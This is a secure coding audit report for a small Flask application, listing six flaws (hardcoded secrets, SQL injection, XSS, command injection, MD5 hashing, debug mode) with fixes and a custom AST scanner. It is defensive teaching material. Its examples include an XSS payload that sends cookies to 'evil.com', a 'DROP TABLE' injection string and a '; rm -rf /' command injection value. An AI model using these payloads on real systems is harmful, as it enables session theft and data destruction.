# Secure Coding Review — Findings Report

**Application audited:** `vulnerable_app.py` — a small Flask web application (Python)
**Review method:** Manual code inspection + custom static analyzer (`static_analysis.py`, built on Python's `ast` module)
**Remediated version:** `secure_app.py`

## Summary

| # | Vulnerability | Location | Severity | CWE |
|---|---|---|---|---|
| 1 | Hardcoded secret key & credentials | `app.secret_key`, `DB_PASSWORD` | High | CWE-798 |
| 2 | SQL Injection | `/user` route, string-concatenated query | Critical | CWE-89 |
| 3 | Reflected Cross-Site Scripting (XSS) | `/greet` route | High | CWE-79 |
| 4 | OS Command Injection | `/ping` route, `shell=True` | Critical | CWE-78 |
| 5 | Weak hashing algorithm (MD5) for passwords | `/login` route | Medium | CWE-916 |
| 6 | Debug mode enabled | `app.run(debug=True)` | High | CWE-489 |

## Detailed Findings & Remediation

### 1. Hardcoded Secrets (High)
**Issue:** The Flask `secret_key` and a database password are hardcoded directly
in source code. Anyone with repo access (or a leaked copy) gets the secret,
which can be used to forge session cookies.
**Fix:** Load secrets from environment variables or a secrets manager
(`os.environ.get("SECRET_KEY")`), never commit them to version control.

### 2. SQL Injection (Critical)
**Issue:** The `/user` endpoint builds a SQL query by concatenating raw user
input (`request.args.get("id")`) into the query string. A request like
`/user?id=1 OR 1=1` or `id=1; DROP TABLE users;--` can read or destroy data.
**Fix:** Use parameterized queries (`cursor.execute("... WHERE id = ?", (user_id,))`)
so the database driver treats input strictly as data, never as SQL syntax.
Also validate that `id` is numeric before use.

### 3. Reflected XSS (High)
**Issue:** The `/greet` endpoint drops user input straight into an HTML
template string. A request like `/greet?name=<script>document.location='//evil.com/steal?c='+document.cookie</script>`
executes attacker JavaScript in the victim's browser.
**Fix:** Escape all user-controlled output before rendering
(`from flask import escape`) or use Jinja2 templates with autoescaping
enabled (Flask's `render_template` does this by default — avoid
`render_template_string` with raw f-strings).

### 4. Command Injection (Critical)
**Issue:** The `/ping` endpoint passes user input directly into a shell
command via `subprocess.check_output(..., shell=True)`. A request like
`/ping?host=8.8.8.8; rm -rf /` would execute arbitrary shell commands.
**Fix:** Never use `shell=True` with untrusted input. Pass arguments as a
list (`["ping", "-c", "1", host]`) so the OS executes the binary directly
without shell interpretation, and validate `host` against a strict
allow-list pattern (letters, digits, dots, hyphens only).

### 5. Weak Password Hashing (Medium)
**Issue:** Passwords are hashed with MD5, which is fast and has known
collision weaknesses — attackers can brute-force or rainbow-table crack it
easily.
**Fix:** Use a slow, salted, purpose-built password hashing algorithm such
as bcrypt, scrypt, or Argon2 (`bcrypt.hashpw()` / `bcrypt.checkpw()`).

### 6. Debug Mode in Production (High)
**Issue:** `app.run(debug=True)` enables Flask's interactive debugger,
which can allow remote code execution if an unhandled exception is
triggered by an attacker on a reachable server.
**Fix:** Default `debug` to `False`; only enable it via an explicit
environment variable during local development, and never in a deployed
environment.

## Tooling Notes

- `static_analysis.py` is a custom lightweight scanner (using Python's
  built-in `ast` module) that automatically flags 5 of the 6 issues above
  by pattern-matching AST nodes (string concatenation into SQL-looking
  text, `shell=True`, weak hash calls, `debug=True`, hardcoded secret
  assignments, and unescaped f-strings passed to `render_template_string`).
- For a production-grade review, complement manual review with established
  tools: `bandit` (Python-specific static analyzer), `semgrep`, or
  `pylint` with security plugins.
- Run: `python static_analysis.py vulnerable_app.py` to reproduce the
  automated findings.

## Recommendations Going Forward

1. Adopt a secrets manager (e.g., environment variables + `.env` excluded
   from git, or a vault service) — never commit credentials.
2. Use an ORM (SQLAlchemy) or parameterized queries everywhere; ban raw
   string-built SQL in code review checklists.
3. Enable Jinja2 autoescaping and avoid `render_template_string` with
   f-strings.
4. Ban `shell=True` in subprocess calls via a linter rule; validate/allow-list
   any input that reaches an external process.
5. Standardize on bcrypt/Argon2 for password hashing across the codebase.
6. Add a pre-deployment check that fails the build if `debug=True` is
   hardcoded anywhere.
